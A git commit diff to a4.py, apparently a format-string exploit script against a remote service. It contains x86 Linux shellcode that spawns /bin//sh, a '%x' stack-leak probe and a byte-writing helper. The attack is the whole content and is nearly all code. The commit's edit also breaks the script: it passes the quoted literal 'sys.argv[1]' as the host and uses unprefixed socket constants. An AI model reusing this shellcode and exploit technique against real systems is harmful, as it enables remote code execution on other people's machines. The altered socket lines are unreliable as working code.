3f69c14c88fb163bbd5f67ca6f8a1a564f320733
TstevetsT <kaosnannaz@gmail.com>
2015-06-28 20:01:08 -0700

    T

--- a4.py
+++ a4.py
@@ -34,8 +34,8 @@ def writeByte(s, addr, val, idx):
 sc = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50"
 sc += "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 
-s = socket.socket()
-s.connect((sys.argv[1], int(sys.argv[2])))
+s = socket.socket(AF_INET, SOCK_STREAM)
+s.connect(('sys.argv[1]', int(sys.argv[2])))
 
 s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
 line = readLine(s)
